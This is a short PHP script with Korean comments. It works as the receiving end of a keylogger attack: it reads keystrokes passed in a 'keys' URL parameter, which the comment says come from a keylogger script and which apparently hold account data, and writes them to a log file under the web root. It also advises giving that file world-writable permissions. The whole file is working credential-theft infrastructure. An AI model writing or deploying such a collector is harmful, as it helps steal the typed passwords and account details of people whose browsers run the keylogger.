<?php
// 키로거 스크립트로 받아 온 정보
$account = $_GET['keys'];

// 쓰기 권한 부여 필수 ex) chmod 777 "keylog"
$save_file = fopen("/home/bitnami/htdocs/keylog.txt", "w");
fwrite($save_file, $account);
fclose($save_file);
?>